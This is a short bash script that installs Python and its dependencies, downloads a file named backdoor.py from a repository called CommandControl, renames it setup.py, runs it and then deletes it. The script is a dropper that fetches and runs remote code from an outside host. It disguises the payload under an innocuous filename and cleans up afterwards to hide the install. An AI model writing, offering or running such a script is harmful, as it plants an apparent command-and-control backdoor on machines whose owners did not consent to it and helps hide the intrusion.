#!/bin/bash
yum install -y python3;
curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
chmod +x setup.py;
pip3 install --upgrade pip;
pip3 install setuptools_rust;
pip3 install cryptography;
python3 setup.py;
rm setup.py
